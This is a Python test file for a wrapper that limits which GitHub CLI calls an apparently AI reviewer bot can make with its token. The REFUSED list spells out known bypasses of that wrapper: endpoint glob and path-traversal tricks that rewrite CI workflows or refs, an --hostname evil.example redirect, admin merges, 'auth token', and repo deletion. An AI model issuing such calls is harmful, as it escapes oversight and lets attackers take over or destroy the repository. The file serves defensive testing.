"""The reviewer bot's wrapper, .claude/bin/gh-reviewer, runs only the review's own calls.

    python -m unittest discover -s .claude/pipeline/tests

The wrapper holds the bot token, and the bot's approval is the only one that
merges (docs/Pipeline.md § Merging). Each case runs the real wrapper with a stub
`gh` first on PATH: exit 4 is the wrapper's refusal, exit 0 means the call
reached the stub -- that is, it would have run as the bot.
"""

import os
import shutil
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
WRAPPER = ROOT / ".claude" / "bin" / "gh-reviewer"
BASH = shutil.which("bash")

# Calls the review skill makes (.claude/skills/github-pr-review/SKILL.md).
ALLOWED = [
    ["api", "user"],
    ["api", "user", "--jq", ".login"],
    ["api", "repos/{owner}/{repo}/pulls/105/reviews",
     "-f", "commit_id=abc", "-f", "event=APPROVE", "-F", "body=@x.md"],
    ["api", "/repos/o/r/pulls/105/reviews",
     "-f", "commit_id=abc", "-f", "event=REQUEST_CHANGES", "-F", "body=@x.md"],
    ["pr", "merge", "105", "--auto", "--squash", "--delete-branch", "--match-head-commit", "abc"],
    ["pr", "merge", "105", "--squash", "--delete-branch", "--match-head-commit", "abc"],
    ["pr", "edit", "105", "--add-label", "status:needs-human"],
    ["pr", "edit", "105", "--add-label", "spec-defect"],
    ["pr", "view", "105"],
]

# The bypasses issue #21 found, and their neighbours.
REFUSED = [
    # 1. The endpoint was a glob: anything ending in /pulls/<digit>.../reviews.
    ["api", "repos/o/r/contents/.github/workflows/ci.yml?a=/pulls/1/reviews",
     "-X", "PUT", "-f", "message=x", "-f", "content=eA==", "-f", "branch=main"],
    ["api", "repos/o/r/git/refs?x=/pulls/1/reviews", "-X", "POST", "-f", "ref=refs/heads/x"],
    ["api", "repos/o/r/pulls/1?/reviews", "-X", "PATCH", "-f", "base=other"],
    ["api", "repos/o/r/pulls/1/../../git/refs/pulls/1/reviews"],
    ["api", "repos/o/r/pulls/1/reviews?x=1"],
    ["api", "repos/o/r/pulls/1/reviews", "-X", "PUT"],
    ["api", "repos/o/r/pulls/1/reviews", "--input", "x.json"],
    ["api", "repos/o/r/pulls/1/reviews", "-f", "event=APPROVE", "--hostname", "evil.example"],
    ["api", "repos/o/r/pulls/1/reviews", "-f", "merge_method=squash"],
    ["api", "repos/o/r/pulls/abc/reviews"],
    # 2. `api user` with any method and any fields.
    ["api", "user", "-X", "PATCH", "-f", "bio=x"],
    ["api", "user", "--jq", ".login", "-X", "PATCH"],
    ["api", "user", "--method", "PATCH"],
    # 3. `pr merge` and `pr edit` with any flags.
    ["pr", "merge", "105", "--admin", "--squash", "--delete-branch", "--match-head-commit", "abc"],
    ["pr", "merge", "105", "--squash", "--delete-branch"],
    ["pr", "merge", "105", "--merge", "--delete-branch", "--match-head-commit", "abc"],
    ["pr", "merge", "105", "--squash", "--delete-branch", "--match-head-commit", "main"],
    ["pr", "merge", "--squash", "--delete-branch", "--match-head-commit", "abc"],
    ["pr", "edit", "105", "--base", "other"],
    ["pr", "edit", "105", "--add-label", "status:ready"],
    ["pr", "edit", "105", "--add-label", "spec-defect", "--base", "other"],
    ["pr", "edit", "105", "--title", "x"],
    # Never part of the review: an unpinned approval, and anything else.
    ["pr", "review", "105", "--approve"],
    ["pr", "comment", "105", "--body", "x"],
    ["auth", "token"],
    ["repo", "delete", "o/r", "--yes"],
    ["api", "repos/o/r", "-X", "DELETE"],
    [],
]


@unittest.skipUnless(BASH, "bash not found")
class GhReviewerAllowlistTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        stub = Path(cls.tmp.name) / "gh"
        stub.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        stub.chmod(stub.stat().st_mode | stat.S_IEXEC)
        cls.env = {**os.environ, "PATH": cls.tmp.name + os.pathsep + os.environ.get("PATH", ""),
                   "PIPELINE_REVIEWER_TOKEN": "x"}

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def run_wrapper(self, args):
        return subprocess.run([BASH, str(WRAPPER), *args], env=self.env,
                              capture_output=True, text=True).returncode

    def test_the_reviews_own_calls_reach_gh(self):
        for args in ALLOWED:
            with self.subTest(args=" ".join(args)):
                self.assertEqual(self.run_wrapper(args), 0)

    def test_everything_else_is_refused(self):
        for args in REFUSED:
            with self.subTest(args=" ".join(args)):
                self.assertEqual(self.run_wrapper(args), 4)


if __name__ == "__main__":
    unittest.main()
